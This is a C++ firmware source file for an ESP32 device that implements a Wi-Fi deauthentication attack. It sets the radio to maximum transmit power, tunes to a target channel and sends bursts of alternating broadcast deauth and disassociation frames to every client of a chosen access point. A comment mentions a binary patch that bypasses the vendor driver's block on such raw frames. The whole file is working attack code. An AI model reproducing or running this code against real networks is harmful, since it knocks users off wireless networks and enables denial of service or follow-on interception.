// Wi-Fi de-auth device-side session (internal engineering notes phase 7).
// Compiled only when WIFI_DEAUTH_ENABLE=1; default build links nothing here.
#include "deauth.h"

#if WIFI_DEAUTH_ENABLE

#include <Arduino.h>
#include <cstring>
#include <WiFi.h>
#include <esp_wifi.h>                 // esp_wifi_80211_tx (public raw TX, verified in prebuilt 3.3.11)
#include "radios.h"

namespace deauth {

static const int    kFrames = 5;     // short bounded burst (internal engineering notes)
static const int    kGapMs  = 50;    // inter-frame spacing
static Target       g_t;
static uint32_t g_sent = 0, g_err = 0, g_last_err = 0;
static bool         g_up   = false;
// TX power knob: int8_t in 0.25 dBm units, range [8, 84] per
// esp_wifi_set_max_tx_power docs (84 ~= 20.75 dBm, the driver ceiling).
// Default 84 = max; 'p' on the serial console steps it down.
static int8_t       g_tx_power = 84;

void set_tx_power(int8_t p) {
    if (p < 8) p = 8;
    if (p > 84) p = 84;
    g_tx_power = p;
}

static bool session_up() {
    if (g_up) return true;
    WiFi.mode(WIFI_STA);            // driver init + mode, never associates
    // 3.x WiFi.mode() inits the driver but does NOT call esp_wifi_start()
    // (only the connect path does). Raw TX needs a started driver, so start
    // it explicitly. (The 0.4.1-era 0x102 was NOT this — it was
    // ESP_ERR_NOT_SUPPORTED from the prebuilt's raw-frame allowlist, now
    // bypassed by the the guarded local patch binary patch. Keep this call
    // as correct defensive init regardless.)
    if (esp_wifi_start() != ESP_OK) {
        Serial.printf("DEAUTH WISTARTFAIL\n");
        return false;
    }
    if (esp_wifi_set_max_tx_power(g_tx_power) != ESP_OK) {
        Serial.printf("DEAUTH PWRFAIL p=%d\n", (int)g_tx_power);
        return false;
    }
    if (esp_wifi_set_channel((uint8_t)g_t.chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        Serial.printf("DEAUTH CHFAIL ch=%d\n", g_t.chan);
        return false;
    }
    g_up = true;
    return true;
}

bool begin_session(const Target &t) {
    g_t = t;
    g_sent = g_err = 0;
    WiFi.mode(WIFI_STA);
    if (!session_up()) return false;
    radios::power_down_all();       // nRF24 stays down for the whole session
    Serial.printf("DEAUTH START bssid=%s ssid=%s ch=%d frames=%d gap=%d ms txpower=%d(0.25dBm)\n",
                  t.bssid, t.ssid[0] ? t.ssid : "(hidden)", t.chan, kFrames, kGapMs, (int)g_tx_power);
    return true;
}

bool retarget(const Target &t) {
    if (!g_up) return false;
    g_t = t;
    if (esp_wifi_set_channel((uint8_t)g_t.chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        Serial.printf("DEAUTH RETARGETFAIL ch=%d\n", g_t.chan);
        return false;
    }
    return true;
}

int tx_burst() {
    if (!session_up()) return 0;
    int sent = 0;
    for (int i = 0; i < kFrames; ++i) {
        uint8_t dst[6], bssid[6], f[26];
        if (!parse_mac(g_t.bssid, bssid)) return 0;
        memset(dst, 0xFF, 6);                      // all stations of the BSSID
        // Alternate deauth/disassoc within the burst: some clients drop on
        // one frame type and not the other.
        int len = (i & 1) ? build_disassoc_frame(f, dst, bssid)
                          : build_deauth_frame(f, dst, bssid);
        // en_sys_seq=true: driver owns the sequence number (reference-
        // known-good setting for this API).
        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, f, len, true);
        if (r == ESP_OK) { ++sent; ++g_sent; }
        else { ++g_err; g_last_err = (uint32_t)r; }
        if (i + 1 < kFrames) delay(kGapMs);
    }
    if (sent && g_err == 0)
        Serial.printf("DEAUTH BURST frames=%d\n", sent);
    else
        Serial.printf("DEAUTH BURST sent=%d err=%d last=0x%08lX\n", sent, (int)g_err, (unsigned long)g_last_err);
    return sent;
}

void stop_session(const char *reason) {
    uint32_t sent = g_sent, err = g_err;
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);            // Wi-Fi OFF — the safe state
    g_up = false;
    radios::power_down_all();
    Serial.printf("DEAUTH STOP reason=%s frames_sent=%u frames_err=%u\n",
                  reason, (unsigned)sent, (unsigned)err);
}

uint32_t frames_sent() { return g_sent; }
uint32_t frames_err()  { return g_err; }
uint32_t last_error()  { return g_last_err; }

}

#endif  // WIFI_DEAUTH_ENABLE
